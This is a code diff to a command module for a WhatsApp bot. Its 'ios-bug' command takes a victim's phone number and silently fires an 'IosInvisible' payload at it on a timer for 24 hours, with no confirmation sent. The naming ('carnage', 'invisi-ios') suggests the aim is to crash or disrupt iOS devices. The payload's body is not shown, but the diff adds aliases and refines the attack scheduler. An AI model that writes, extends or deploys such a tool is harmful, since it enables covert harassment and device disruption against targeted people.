@@ -86,24 +86,29 @@ async function IosInvisible(client, targetJid) {
 
 export default {
   name: "ios-bug",
+  alias: ["ios", "invisi-ios"],
   description: "ios-bug 24h silencieux (aucune confirmation)",
 
-  async execute(context) {
-    const { sock, from, msg, args } = context;
+  async execute(sock, msg, args, from) {
+    // (Optionnel) Restreindre au propriétaire – décommentez si besoin
+    // const sender = msg.key.remoteJid.endsWith("@g.us") ? msg.key.participant : msg.key.remoteJid;
+    // const senderNum = sender.split("@")[0].replace(/[^0-9]/g, "");
+    // const ownerNum = global.owners?.[0];
+    // if (senderNum !== ownerNum) {
+    //   return sock.sendMessage(from, { text: "❌ Seul le propriétaire peut utiliser cette commande." });
+    // }
 
     let targetNumber = args?.[0] || "";
-
     if (!targetNumber) {
-      return sock.sendMessage(from, { 
-        text: "❌ Numéro manquant\n.ios-bug 237xxxxxxxx" 
+      return sock.sendMessage(from, {
+        text: "❌ Numéro manquant\n.ios-bug 237xxxxxxxx"
       }, { quoted: msg });
     }
 
     targetNumber = targetNumber.replace(/[^0-9]/g, "");
-    
     if (targetNumber.length < 8) {
-      return sock.sendMessage(from, { 
-        text: "❌ Numéro invalide" 
+      return sock.sendMessage(from, {
+        text: "❌ Numéro invalide"
       }, { quoted: msg });
     }
 
@@ -115,14 +120,11 @@ export default {
 
     let count = 0;
 
-    const actions = [
-    IosInvisible ];
+    const actions = [IosInvisible]; // Ajoutez d'autres fonctions ici si nécessaire
 
-
-    // Lancement silencieux
+    // Lancement silencieux (aucun message de confirmation)
     const interval = setInterval(async () => {
       count++;
-
       for (const fn of actions) {
         try {
           if (typeof fn === "function") {
@@ -132,16 +134,15 @@ export default {
           console.error(`Erreur fonction ${fn.name || ""}`, err);
         }
       }
-
       if (count >= totalExecutions) {
         clearInterval(interval);
-        global.carnageInterval = null;
+        if (global.carnageInterval === interval) global.carnageInterval = null;
       }
     }, intervalMinutes * 60 * 1000);
 
-    global.carnageInterval = interval;
+    global.carnageInterval = interval; // Stocke l'intervalle pour un éventuel arrêt
 
-    // Aucun message envoyé après le démarrage
-    console.log(`[IOS] Démarré silencieusement sur ${targetNumber} pour 24h`);
+    // Aucun message envoyé après le démarrage (silencieux)
+    console.log(`[IOS-BUG] Démarré silencieusement sur ${targetNumber} pour 24h`);
   }
 };
